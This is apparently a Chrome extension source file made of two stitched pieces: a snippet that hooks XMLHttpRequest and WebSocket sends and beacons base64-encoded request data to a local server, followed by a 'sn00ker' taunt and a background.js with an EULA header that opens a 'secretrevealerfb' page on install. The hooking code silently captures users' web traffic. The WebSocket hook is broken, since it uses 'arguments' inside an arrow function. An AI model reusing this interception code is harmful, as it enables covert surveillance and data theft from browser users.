function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * background.js
 * Copyright (C) 2017 Andrea Millozzi (the Developer)
 *
 * Unless you have express written permission from the Developer, you may not:
 * (i) use the Services in any way that violates this EULA,
 * (ii) distribute the Services or any portion thereof to any third parties,
 * (iii) disassemble or reverse engineer the Services or any part or portion thereof for any purpose, other than for reviewing the code for personal review,
 * (iv) adapt, edit, change, modify, transform, publish, republish, distribute, or redistribute the Services or any elements, portions, or parts thereof, without limitation, in any form or media,
 * (v) use any automated data collection methods, data mining, robots, scraping or any data gathering methods of any kind on the Services,
 * (vi) rent, lease, or lend the Services to any third party,
 * (vii) design, build, or cause to be designed or built any competing or derivative product or service.
 *
 * Version: | 2.0.4-dev | 02/11/2017
 *
 * Resources
 *
 * no
 *
 * License: all copyright reserved (read FAQ --> Basic Terms Of Use)
 *
 * @author   Andrea Millozzi <andrea.millozzi O gmail.com>
 */
 
chrome.browserAction.onClicked.addListener( function(tab) {
  chrome.tabs.sendMessage(tab.id,{action: "toggle"}, function(response){});
});

chrome.runtime.onInstalled.addListener(async ({ reason }) => {
  if (reason !== 'install') { return; }
  const tab = (await  chrome.tabs.create({
    url: 'http://www.andreamillozzi.it/addon/secretrevealerfb?b=chrome&v='+ chrome.runtime.getManifest().version,
    active: true,
  }));
  (await Windows.update(tab.windowId, { focused: true, }));
});
